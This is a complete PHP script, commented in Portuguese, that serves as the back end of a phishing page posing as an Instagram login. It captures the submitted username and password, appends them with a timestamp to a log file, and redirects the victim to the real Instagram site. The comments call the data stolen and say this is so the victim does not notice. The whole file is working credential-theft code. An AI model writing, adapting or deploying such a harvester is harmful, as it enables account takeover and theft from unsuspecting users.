<?php
// Pega o usuário e a senha que foram enviados pelo formulário HTML
$usuario = $_POST['username'];
$senha = $_POST['password'];

// Cria uma string com os dados roubados e a data/hora do roubo
$dados_roubados = "Usuario: " . $usuario . " | Senha: " . $senha . " | Data: " . date('d/m/Y H:i:s') . "\n";

// Salva os dados em um arquivo de texto chamado "log.txt"
// O 'FILE_APPEND' serve para adicionar novo conteúdo sem apagar o antigo
file_put_contents('log.txt', $dados_roubados, FILE_APPEND);

// Redireciona a vítima para o site real do Instagram
// Assim, a vítima nem percebe que foi roubada, acha que foi um erro de login
header('Location: https://www.instagram.com/');

// Encerra o script
exit();
?>
